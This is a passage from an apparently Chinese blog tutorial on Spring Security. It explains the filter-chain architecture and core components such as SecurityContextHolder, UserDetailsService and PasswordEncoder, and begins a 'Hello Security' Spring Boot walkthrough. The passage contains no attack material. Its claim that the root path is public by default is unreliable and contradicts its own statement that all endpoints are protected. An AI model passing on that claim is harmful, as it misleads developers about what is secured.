</ul>
</li>
<li><strong>久经考验，社区活跃</strong><ul>
<li>它是一个非常成熟的开源项目，被全球数百万的Java项目所使用，其稳定性和安全性经过了长时间和大规模应用的检验。活跃的社区和及时的版本更新也保证了它可以持续对抗新出现的安全威胁。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="1-2-Spring-Security-简介与架构概览"><a href="#1-2-Spring-Security-简介与架构概览" class="headerlink" title="1.2 Spring Security 简介与架构概览"></a>1.2 Spring Security 简介与架构概览</h3><h4 id="1-2-1-核心思想：基于-Servlet-过滤器的责任链模式"><a href="#1-2-1-核心思想：基于-Servlet-过滤器的责任链模式" class="headerlink" title="1.2.1 核心思想：基于 Servlet 过滤器的责任链模式"></a>1.2.1 核心思想：基于 Servlet 过滤器的责任链模式</h4><p>Spring Security 的核心是<strong>一系列的 Servlet 过滤器（Servlet Filter）</strong>。</p>
<p>Spring Security 利用了 Servlet Filter 这一标准机制。它将不同的安全职责（如 CSRF 防护、Session 管理、认证处理、授权检查等）封装到一个个独立的 Filter 中，并将它们组织成一个<strong>有序的链条（Filter Chain）</strong>。</p>
<p>当一个 HTTP 请求进入应用时，它会像通过依次穿过这个过滤器链。</p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>解耦</strong>：每个 Filter 只关心自己的职责，高度内聚。</li>
<li><strong>可插拔</strong>：我们可以根据需要，轻松地在链条中添加、移除或替换某个 Filter，实现高度定制化。</li>
<li><strong>与框架无关</strong>：由于它工作在 Servlet 层面，因此它能在 <code>DispatcherServlet</code> 之前就保护你的应用，而不仅仅是保护 Spring MVC 的 Controller。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-2-2-宏观架构：从请求入口到安全处理"><a href="#1-2-2-宏观架构：从请求入口到安全处理" class="headerlink" title="1.2.2 宏观架构：从请求入口到安全处理"></a>1.2.2 宏观架构：从请求入口到安全处理</h4><p>一个典型的请求在 Spring Security 中的旅程如下：</p>
<pre><code class="highlight mermaid">graph LR


    subgraph &quot;Spring容器&quot;
        subgraph C[&quot;FilterChainProxy&quot;]
            E[SecurityFilterChain]
            F[SecurityFilterChain]
            G[SecurityFilterChain]
            ....
        end
    end

    subgraph &quot;Servlet容器&quot;
        subgraph &quot;过滤器链&quot;
            B[DelegatingFilterProxy]
        end
    end

    A[客户端]
    A--&gt;|HTTP请求|B
    B--&gt;C</code></pre>

<ol>
<li><strong>客户端</strong> 发起一个 HTTP 请求（例如，访问 <code>/dashboard</code>）。</li>
<li>请求首先到达 <strong>Servlet 容器</strong>（如 Tomcat）。</li>
<li>容器的过滤器链中，一个名为 <code>DelegatingFilterProxy</code> 的特殊 Filter 会被触发。</li>
<li><strong><code>DelegatingFilterProxy</code></strong>：<ul>
<li>它本身是一个标准的 Servlet Filter，生命周期由 Servlet 容器管理。</li>
<li>它的作用像一个**“桥梁”<strong>，它不做任何安全逻辑，唯一的任务就是在 Spring 的应用上下文（ApplicationContext）中找到一个名为 <code>springSecurityFilterChain</code>（这是一个 Bean 的名字）的代理，并将请求处理</strong>委托（Delegate）**给它。</li>
<li><strong>为什么需要这个桥梁？</strong> 因为 Servlet Filter 是由容器加载的，而 Spring Security 的所有组件都是 Spring 管理的 Bean。<code>DelegatingFilterProxy</code> 解决了 Servlet 世界和 Spring 世界之间的连接问题。</li>
</ul>
</li>
<li><strong><code>FilterChainProxy</code></strong> (即 <code>springSecurityFilterChain</code> Bean)：<ul>
<li>这是一个由 Spring Security 提供的功能极其强大的 Filter。可以称它为**“过滤器链的管理者”**。</li>
<li>它内部维护了<strong>一个或多个安全过滤器链 (<code>SecurityFilterChain</code>)</strong>。</li>
<li>当请求到达时，<code>FilterChainProxy</code> 会根据请求的 URL 路径，决定使用哪一个 <code>SecurityFilterChain</code> 来处理这个请求。这允许我们为不同的路径（如 <code>/api/**</code> 和 <code>/web/**</code>）配置完全不同的安全策略。</li>
</ul>
</li>
<li><strong><code>SecurityFilterChain</code></strong>：<ul>
<li>这就是我们通常通过 Java 配置（<code>@Bean public SecurityFilterChain ...</code>）来定义的东西。它是一个<strong>包含了多个具体安全过滤器的有序列表</strong>。</li>
<li>请求会按照这个列表的顺序，依次通过每一个 Filter。</li>
<li><strong>常见的 Filter 包括（顺序很重要）</strong>：<ul>
<li><code>CsrfFilter</code>: 进行 CSRF 令牌校验。</li>
<li><code>UsernamePasswordAuthenticationFilter</code>: 处理基于表单的用户名密码登录请求。</li>
<li><code>BasicAuthenticationFilter</code>: 处理 HTTP Basic 认证。</li>
<li><code>AuthorizationFilter</code>: 检查用户是否有权限访问请求的资源。</li>
<li>等等…</li>
</ul>
</li>
</ul>
</li>
<li><strong>处理流程</strong>：<ul>
<li>如果请求在链条的某个 Filter 中处理失败（例如，CSRF 令牌无效，或认证失败），该 Filter 会**“短路” (Short-circuit)** 整个流程，直接向客户端返回错误响应（如 401 Unauthorized 或 403 Forbidden），请求将不会到达后续的 Filter 或业务代码。</li>
<li>如果请求成功通过了整个过滤器链，它最终会被放行，到达 <code>DispatcherServlet</code>，并由你的 Controller 进行处理。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="1-2-3-状态管理：SecurityContextHolder"><a href="#1-2-3-状态管理：SecurityContextHolder" class="headerlink" title="1.2.3 状态管理：SecurityContextHolder"></a>1.2.3 状态管理：<code>SecurityContextHolder</code></h4><p>当一个用户通过认证后，他的身份信息（比如用户名、角色权限）将会存放到 <strong><code>SecurityContextHolder</code></strong>。</p>
<ul>
<li><strong><code>SecurityContextHolder</code></strong> 是一个<strong>全局的、静态的</strong>工具类，用于存储和获取当前线程的安全上下文（<code>SecurityContext</code>）。</li>
<li>默认情况下，它使用 <strong><code>ThreadLocal</code></strong> 策略来存储 <code>SecurityContext</code>。这意味着安全上下文与<strong>当前执行的线程</strong>绑定。当一个请求进入时，Spring Security 会为该请求的线程创建一个<code>SecurityContext</code>；当请求处理完毕时，它会清理这个上下文。</li>
<li><strong><code>SecurityContext</code></strong>：它主要的作用是持有 <code>Authentication</code> 对象。</li>
<li><strong><code>Authentication</code></strong>：这是 Spring Security 中代表认证信息的核心接口。它包含了：<ul>
<li><strong><code>principal</code></strong>: 代表“当事人”，通常是 <code>UserDetails</code> 对象，包含了用户的详细信息（用户名、密码、账户状态等）。</li>
<li><strong><code>authorities</code></strong>: 代表用户拥有的权限集合（如 <code>ROLE_ADMIN</code>, <code>READ_PRIVILEGE</code>）。</li>
<li><strong><code>credentials</code></strong>: 用户的凭证（如密码），在认证成功后通常会被清空。</li>
</ul>
</li>
</ul>
<p><strong>整个流程串联起来</strong>：当 <code>UsernamePasswordAuthenticationFilter</code> 成功认证一个用户后，它会创建一个完整的 <code>Authentication</code> 对象，并将其设置到 <code>SecurityContextHolder.getContext()</code> 中。之后，当请求到达 <code>AuthorizationFilter</code> 时，它就会从 <code>SecurityContextHolder</code> 中取出这个 <code>Authentication</code> 对象，检查其中的权限，来决定是否放行。你的业务代码中也可以随时通过 <code>SecurityContextHolder</code> 获取当前登录用户的信息。</p>
<hr>
<h3 id="1-3-核心组件详解"><a href="#1-3-核心组件详解" class="headerlink" title="1.3 核心组件详解"></a>1.3 核心组件详解</h3><h4 id="1-3-1-SecurityFilterChain"><a href="#1-3-1-SecurityFilterChain" class="headerlink" title="1.3.1 SecurityFilterChain"></a>1.3.1 <code>SecurityFilterChain</code></h4><ul>
<li><p><strong>是什么？</strong></p>
<ul>
<li><code>SecurityFilterChain</code> 是一个接口，其实现类包含一个<strong>有序的 Servlet Filter 列表</strong>。它代表了一套完整的、针对特定 HTTP 请求的安全处理策略。</li>
</ul>
</li>
<li><p><strong>职责</strong>：</p>
<ul>
<li>定义哪些过滤器（Filters）被应用。</li>
<li>定义这些过滤器的应用顺序。</li>
<li>定义这个过滤器链作用于哪些 HTTP 请求（通过 <code>requestMatcher</code>）。</li>
</ul>
</li>
<li><p><strong>现代配置的核心</strong>：</p>
<ul>
<li>在现代的 Spring Security 配置中（Spring Boot 2.7+），我们不再继承 <code>WebSecurityConfigurerAdapter</code>（已废弃），而是直接在 <code>@Configuration</code> 类中定义一个或多个 <code>@Bean</code> 方法，返回 <code>SecurityFilterChain</code> 实例。</li>
<li>每个 <code>SecurityFilterChain</code> Bean 都定义了一套独立的、互不干扰的安全规则。这使得我们可以非常灵活地为不同路径（如 <code>/api/**</code> 和 <code>/</code>）配置不同的安全策略。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">apiFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .securityMatcher(<span class="string">&quot;/api/**&quot;</span>) <span class="comment">// 这个链只处理 /api/ 开头的请求</span></span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())</span><br><span class="line">            .httpBasic(); <span class="comment">// 对 API 使用 HTTP Basic 认证</span></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">webFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">                .requestMatchers(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;/css/**&quot;</span>).permitAll()</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">            )</span><br><span class="line">            .formLogin(); <span class="comment">// 对其他所有请求使用表单登录</span></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="1-3-2-核心过滤器概览"><a href="#1-3-2-核心过滤器概览" class="headerlink" title="1.3.2 核心过滤器概览"></a>1.3.2 核心过滤器概览</h4><h5 id="1-SecurityContextHolderFilter"><a href="#1-SecurityContextHolderFilter" class="headerlink" title="1. SecurityContextHolderFilter"></a>1. <code>SecurityContextHolderFilter</code></h5><ul>
<li><strong>核心职责：</strong> <strong>建立和清理安全上下文（SecurityContext）。</strong> 它是责任链中非常靠前的一个过滤器。</li>
<li><strong>详细说明：</strong><ul>
<li><strong>请求进入时：</strong> 它的主要任务是从 <code>SecurityContextRepository</code> (通常是基于 <code>HttpSession</code>) 中加载 <code>SecurityContext</code>，然后将其设置到 <code>SecurityContextHolder</code> 中。这样，在整个请求处理期间，后续的过滤器、AOP 切面以及你自己的业务代码都能通过 <code>SecurityContextHolder.getContext()</code> 方便地获取到当前用户的认证信息。</li>
<li><strong>请求结束时：</strong> 在 <code>finally</code> 块中，它会清理 <code>SecurityContextHolder</code> 中的内容，防止因线程复用导致的数据泄露。同时，它会将变更后的 <code>SecurityContext</code> 写回 <code>SecurityContextRepository</code>，实现状态持久化。</li>
</ul>
</li>
</ul>
<h5 id="2-CsrfFilter"><a href="#2-CsrfFilter" class="headerlink" title="2. CsrfFilter"></a>2. <code>CsrfFilter</code></h5><ul>
<li><strong>核心职责：</strong> <strong>防御跨站请求伪造（CSRF）攻击。</strong></li>
<li><strong>详细说明：</strong> 该过滤器会检查所有“状态变更”的请求（如 <code>POST</code>, <code>PUT</code>, <code>DELETE</code>），验证请求中是否包含一个合法、有效的 CSRF 令牌（Token）。如果令牌不存在或不匹配，请求将被直接拒绝。对于 <code>GET</code> 等安全请求，它通常会生成一个新的令牌并附加到响应中，供前端后续使用。</li>
</ul>
<h5 id="3-UsernamePasswordAuthenticationFilter"><a href="#3-UsernamePasswordAuthenticationFilter" class="headerlink" title="3. UsernamePasswordAuthenticationFilter"></a>3. <code>UsernamePasswordAuthenticationFilter</code></h5><ul>
<li><strong>核心职责：</strong> <strong>处理基于表单的用户名和密码登录请求。</strong> 它是认证（Authentication）过程中的关键角色。</li>
<li><strong>详细说明：</strong> 这个过滤器<strong>只关心特定的登录 URL</strong>（默认为 <code>/login</code> 且为 <code>POST</code> 请求）。当请求匹配时，它会从请求体中提取用户名和密码，将它们封装成一个 <code>UsernamePasswordAuthenticationToken</code>（一个 <code>Authentication</code> 的实现类），然后委托给 <code>AuthenticationManager</code> 去执行真正的认证逻辑。</li>
</ul>
<h5 id="4-BasicAuthenticationFilter"><a href="#4-BasicAuthenticationFilter" class="headerlink" title="4. BasicAuthenticationFilter"></a>4. <code>BasicAuthenticationFilter</code></h5><ul>
<li><strong>核心职责：</strong> <strong>处理 HTTP Basic 认证。</strong></li>
<li><strong>详细说明：</strong> 它会检查请求头中是否存在 <code>Authorization: Basic &lt;base64-encoded-credentials&gt;</code>。如果存在，它会解码其中的用户名和密码，并同样委托给 <code>AuthenticationManager</code> 进行认证。这是一种无状态的认证方式，常用于 API 接口。</li>
</ul>
<h5 id="5-AuthorizationFilter"><a href="#5-AuthorizationFilter" class="headerlink" title="5. AuthorizationFilter"></a>5. <code>AuthorizationFilter</code></h5><ul>
<li><strong>核心职责：</strong> <strong>执行授权（Authorization）决策。</strong> 这是访问控制的核心。</li>
<li><strong>详细说明：</strong> 这个过滤器位于认证过滤器之后。当一个请求到达时，它会从 <code>SecurityContextHolder</code> 中获取已经认证成功的 <code>Authentication</code> 对象（包含了用户的角色和权限），然后根据你在配置中定义的访问规则（例如 <code>authorizeHttpRequests().requestMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)</code>），判断当前用户是否有权限访问请求的资源。如果无权访问，它会抛出 <code>AccessDeniedException</code>。</li>
</ul>
<h5 id="6-ExceptionTranslationFilter"><a href="#6-ExceptionTranslationFilter" class="headerlink" title="6. ExceptionTranslationFilter"></a>6. <code>ExceptionTranslationFilter</code></h5><ul>
<li><strong>核心职责：</strong> <strong>捕获安全相关的异常并进行“翻译”和处理。</strong> 它是整个安全体系的“异常调度中心”。</li>
<li><strong>详细说明：</strong> 它本身不处理请求，而是使用 <code>try-catch</code> 块包裹了后续的过滤器链调用。<ul>
<li>如果捕获到 <code>AuthenticationException</code>（认证失败，通常意味着用户根本没登录），它会启动认证流程，例如重定向到登录页面。</li>
<li>如果捕获到 <code>AccessDeniedException</code>（授权失败，用户已登录但权限不足），它会委托给 <code>AccessDeniedHandler</code> 进行处理，通常是返回 403 Forbidden 页面或错误信息。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-3-3-Authentication"><a href="#1-3-3-Authentication" class="headerlink" title="1.3.3 Authentication"></a>1.3.3 <code>Authentication</code></h4><ul>
<li><strong>是什么？</strong><ul>
<li><code>Authentication</code> 是 Spring Security 中代表**“认证信息”**的核心接口。它封装了一个安全请求的所有信息。</li>
</ul>
</li>
<li><strong>职责</strong>：<ul>
<li>回答 <strong>“你是谁？”</strong></li>
<li>在认证<strong>前</strong>，它通常包含用户提交的凭证（如用户名和密码）。</li>
<li>在认证<strong>后</strong>，它包含经过验证的用户主体（Principal）、权限列表，并标记为“已认证”。</li>
</ul>
</li>
<li><strong>核心方法</strong>：<ul>
<li><code>getPrincipal()</code>: 返回用户主体。认证前可能是用户名（一个 <code>String</code>），认证后通常是一个 <code>UserDetails</code> 对象。</li>
<li><code>getCredentials()</code>: 返回用户凭证（如密码）。<strong>认证成功后，框架会自动清空它以策安全</strong>。</li>
<li><code>getAuthorities()</code>: 返回授予用户的权限集合 (<code>Collection&lt;? extends GrantedAuthority&gt;</code>)。</li>
<li><code>isAuthenticated()</code>: 返回一个布尔值，表示此 <code>Authentication</code> 对象是否已经通过了认证。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-3-4-GrantedAuthority"><a href="#1-3-4-GrantedAuthority" class="headerlink" title="1.3.4 GrantedAuthority"></a>1.3.4 <code>GrantedAuthority</code></h4><ul>
<li><strong>是什么？</strong><ul>
<li><code>GrantedAuthority</code> 是一个接口，代表授予用户主体的**“权限”**。</li>
</ul>
</li>
<li><strong>职责</strong>：<ul>
<li>回答 <strong>“你能做什么？”</strong></li>
<li>它可以是一个角色（如 <code>ROLE_ADMIN</code>），也可以是一个更细粒度的权限（如 <code>user:delete</code>）。Spring Security 默认情况下，如果你的字符串以 <code>ROLE_</code> 开头，它会将其视为一个角色。</li>
</ul>
</li>
<li><strong>核心方法</strong>：<ul>
<li><code>getAuthority()</code>: 返回权限的字符串表示。这个字符串会被 <code>AccessDecisionManager</code>（授权管理器）用来做决策。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-3-5-UserDetails-UserDetailsService"><a href="#1-3-5-UserDetails-UserDetailsService" class="headerlink" title="1.3.5 UserDetails &amp; UserDetailsService"></a>1.3.5 <code>UserDetails</code> &amp; <code>UserDetailsService</code></h4><p>这两个组件是连接你的**用户数据存储（如数据库）**和 <strong>Spring Security 框架</strong>之间的桥梁。</p>
<ul>
<li><p><strong><code>UserDetails</code></strong> (接口):</p>
<ul>
<li><strong>是什么？</strong> 它是对你的**用户模型（User Model）**在安全层面的一个抽象。它不关心你的用户有多少个字段（如年龄、邮箱），只关心安全相关的核心数据。</li>
<li><strong>职责</strong>：提供框架所需的核心用户信息。</li>
<li><strong>核心方法</strong>：<ul>
<li><code>getUsername()</code>: 用户名。</li>
<li><code>getPassword()</code>: <strong>已编码的</strong>密码。</li>
<li><code>getAuthorities()</code>: 用户的权限集合 (<code>Collection&lt;? extends GrantedAuthority&gt;</code>)。</li>
<li><code>isAccountNonExpired()</code>, <code>isAccountNonLocked()</code>, <code>isCredentialsNonExpired()</code>, <code>isEnabled()</code>: 一系列表示账户状态的方法，用于控制账户是否可用。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong><code>UserDetailsService</code></strong> (接口):</p>
<ul>
<li><strong>是什么？</strong> 这是一个**数据访问对象（DAO）**模式的接口。</li>
<li><strong>职责</strong>：根据一个用户名（<code>String</code>）加载对应的 <code>UserDetails</code> 对象。</li>
<li><strong>核心方法</strong>：<ul>
<li><code>loadUserByUsername(String username)</code>: 这是该接口唯一的方法。你需要实现这个方法，在其中编写从数据库、LDAP或其他来源查询用户数据的逻辑。如果找不到用户，必须抛出 <code>UsernameNotFoundException</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JpaUserDetailsService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> userRepository.findByUsername(username)</span><br><span class="line">            .orElseThrow(() -&gt; <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;User not found: &quot;</span> + username));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="1-3-6-PasswordEncoder"><a href="#1-3-6-PasswordEncoder" class="headerlink" title="1.3.6 PasswordEncoder"></a>1.3.6 <code>PasswordEncoder</code></h4><ul>
<li><strong>是什么？</strong><ul>
<li>一个用于<strong>密码编码和验证</strong>的服务接口。</li>
</ul>
</li>
<li><strong>职责</strong>：<ul>
<li><code>encode(CharSequence rawPassword)</code>: 将原始明文密码进行单向加密（哈希），生成一个安全的密码摘要。</li>
<li><code>matches(CharSequence rawPassword, String encodedPassword)</code>: 比较用户提交的原始密码和数据库中存储的已编码密码是否匹配。它会自动处理盐（salt）的提取和比对。</li>
</ul>
</li>
<li><strong>安全存储密码的基石</strong>：<ul>
<li><strong>绝对不能</strong>在数据库中存储明文密码！</li>
<li><code>PasswordEncoder</code> 使用<strong>单向哈希算法</strong>（如 BCrypt, SCrypt, Argon2），这意味着无法从加密后的字符串反推出原始密码。</li>
<li>它还自动包含了**“加盐（Salting）”**机制，即使两个用户设置了相同的密码，他们在数据库中存储的哈希值也是不同的，有效防止了彩虹表攻击。</li>
<li><strong>推荐使用</strong>：<code>BCryptPasswordEncoder</code> 是目前最常用和推荐的选择。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-3-7-SecurityContext-SecurityContextHolder"><a href="#1-3-7-SecurityContext-SecurityContextHolder" class="headerlink" title="1.3.7 SecurityContext &amp; SecurityContextHolder"></a>1.3.7 <code>SecurityContext</code> &amp; <code>SecurityContextHolder</code></h4><ul>
<li><strong><code>SecurityContext</code></strong> (接口):<ul>
<li><strong>是什么？</strong> 安全上下文。它本身非常简单，主要职责就是<strong>持有 <code>Authentication</code> 对象</strong>。</li>
<li><strong>核心方法</strong>:<ul>
<li><code>getAuthentication()</code>: 获取认证信息。</li>
<li><code>setAuthentication(Authentication authentication)</code>: 设置认证信息。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>SecurityContextHolder</code></strong> (类):<ul>
<li><strong>是什么？</strong> 一个工具类，用于<strong>存储、访问和管理</strong> <code>SecurityContext</code>。它是外界与当前请求的安全信息交互的<strong>唯一入口</strong>。</li>
<li><strong>职责</strong>：将 <code>SecurityContext</code> 与当前执行线程关联起来。</li>
<li><strong>工作模式</strong>:<ul>
<li>默认使用 <code>ThreadLocal</code> 策略。这意味着 <code>SecurityContext</code> 的生命周期与一个请求线程绑定。当请求开始时，过滤器链会准备好 <code>SecurityContext</code>；请求结束时，<code>SecurityContextHolder</code> 会被清空。这保证了不同请求之间的安全信息是隔离的。</li>
</ul>
</li>
<li><strong>如何使用</strong>:<ul>
<li>在应用的任何地方，你都可以通过静态方法 <code>SecurityContextHolder.getContext().getAuthentication()</code> 来获取当前登录用户的 <code>Authentication</code> 对象，进而得到用户名、权限等信息。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-4-第一个-Spring-Security-应用（”Hello-Security”）"><a href="#1-4-第一个-Spring-Security-应用（”Hello-Security”）" class="headerlink" title="1.4 第一个 Spring Security 应用（”Hello Security”）"></a>1.4 第一个 Spring Security 应用（”Hello Security”）</h3><ul>
<li>依赖引入 (<code>spring-boot-starter-security</code>)</li>
<li>默认的安全配置与自动生成的登录页</li>
<li>最简 Java 配置 (<code>@Configuration</code> &amp; <code>@Bean SecurityFilterChain</code>)</li>
</ul>
<p>这一节的目标是快速搭建一个最基础的 Spring Boot 项目，并引入 Spring Security，观察它在“零配置”下的默认行为，然后通过最简单的 Java 配置对其进行自定义。</p>
<h4 id="第一步：创建-Spring-Boot-项目"><a href="#第一步：创建-Spring-Boot-项目" class="headerlink" title="第一步：创建 Spring Boot 项目"></a>第一步：创建 Spring Boot 项目</h4><p><strong>项目设置:</strong></p>
<ul>
<li><strong>Project</strong>: Maven Project (或 Gradle)</li>
<li><strong>Language</strong>: Java</li>
<li><strong>Spring Boot</strong>: 推荐选择一个稳定的新版本 (如 3.1.x 或更高)</li>
<li><strong>Project Metadata</strong>:<ul>
<li><strong>Group</strong>: <code>com.example</code></li>
<li><strong>Artifact</strong>: <code>hello-security</code></li>
<li><strong>Packaging</strong>: Jar</li>
<li><strong>Java</strong>: 17 (或更高)</li>
</ul>
</li>
</ul>
<p><strong>添加依赖 (Dependencies):</strong></p>
<ol>
<li><strong>Spring Web</strong>: 用于构建 Web 应用，提供 MVC 功能。</li>
<li><strong>Spring Security</strong>: 这是我们的主角，引入安全功能。</li>
<li><strong>(可选) Thymeleaf</strong>: 一个模板引擎，方便我们创建一个简单的页面来测试。</li>
</ol>
<hr>
<h4 id="第二步：创建一个简单的-Controller"><a href="#第二步：创建一个简单的-Controller" class="headerlink" title="第二步：创建一个简单的 Controller"></a>第二步：创建一个简单的 Controller</h4><p>为了测试安全保护，我们需要创建一个简单的 REST Controller，它有一个公共访问的首页和一个需要保护的页面。</p>
<p>在 <code>src/main/java/com/example/hellosecurity</code> 包下创建一个 <code>HomeController.java</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HomeController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">home</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Welcome to the Home Page!&lt;/h1&gt;&lt;p&gt;This page is public.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/dashboard&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">dashboard</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Welcome to your Dashboard!&lt;/h1&gt;&lt;p&gt;This page is protected.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="第三步：启动并观察默认行为"><a href="#第三步：启动并观察默认行为" class="headerlink" title="第三步：启动并观察默认行为"></a>第三步：启动并观察默认行为</h4><p>现在，<strong>不要做任何额外的配置</strong>，直接运行 <code>HelloSecurityApplication</code> 类来启动项目。</p>
<p><strong>你会发现：</strong></p>
<ol>
<li><p><strong>控制台输出密码</strong>：<br>在应用启动的日志中，你会看到一行类似这样的输出：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Using generated security password: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>这是 Spring Security 见你没有配置任何用户，为了方便开发，自动为你生成了一个用户名为 <code>user</code>，密码为这一长串随机字符串的用户。</p>
</li>
<li><p><strong>访问受保护的页面</strong>：<br>打开浏览器，访问 <code>http://localhost:8080/dashboard</code>。<br>你不会看到 “Welcome to your Dashboard!”，而是会被<strong>重定向</strong>到一个由 Spring Security 自动生成的登录页面（<code>http://localhost:8080/login</code>）。</p>
</li>
<li><p><strong>尝试登录</strong>：</p>
<ul>
<li><strong>用户名</strong>: <code>user</code></li>
<li><strong>密码</strong>: 从控制台日志中复制那一长串随机密码。</li>
<li>点击登录后，你会被成功重定向到 <code>/dashboard</code> 页面，并看到我们预期的内容。</li>
</ul>
</li>
<li><p><strong>访问公共页面</strong>：<br>现在，即使你没有登录，访问 <code>http://localhost:8080/</code>。你会发现这个页面可以正常访问。这是因为 Spring Security 的默认策略通常会放行根路径和一些静态资源。</p>
</li>
</ol>
<p><strong>结论</strong>：仅仅通过引入 <code>spring-boot-starter-security</code> 依赖，Spring Security 就已经自动为我们的应用提供了以下功能：</p>
<ul>
<li><strong>保护所有端点</strong>：默认情况下，除了少数例外，所有请求都需要认证。</li>
<li><strong>生成登录表单</strong>：提供了一个基础的、功能完备的登录页面。</li>
<li><strong>默认用户</strong>：创建了一个内存中的用户以供测试。</li>
<li><strong>基础安全防护</strong>：CSRF 保护、HTTP Header 安全设置等都已经默认开启。</li>
</ul>
<hr>
<h4 id="第四步：进行最简-Java-配置"><a href="#第四步：进行最简-Java-配置" class="headerlink" title="第四步：进行最简 Java 配置"></a>第四步：进行最简 Java 配置</h4><p>自动生成的密码非常不方便。现在，让我们通过最简单的 Java 配置来自定义安全行为。</p>
<ol>
<li><p><strong>创建配置类</strong>:<br>在 <code>com.example.hellosecurity</code> 包下创建一个 <code>SecurityConfig.java</code> 类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 